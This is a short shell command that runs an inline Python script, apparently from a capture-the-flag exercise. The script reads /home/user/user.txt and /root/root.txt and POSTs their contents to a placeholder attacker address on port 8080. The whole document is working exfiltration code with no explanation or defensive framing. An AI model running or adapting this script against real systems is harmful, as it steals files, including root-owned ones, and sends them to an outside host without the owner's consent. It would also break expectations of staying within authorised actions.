python3 - <<'PY'
import urllib.request,urllib.parse
paths=['/home/user/user.txt','/root/root.txt']
data=b''
for p in paths:
    try:
        with open(p,'rb') as f: data+=b'\n#'+p.encode()+b'\n'+f.read()
    except Exception as e:
        data+=b'\n#'+p.encode()+b'\nERROR:'+str(e).encode()
req=urllib.request.Request('http://{attacker_ip}:8080/flags',data=data,method='POST')
urllib.request.urlopen(req)
PY
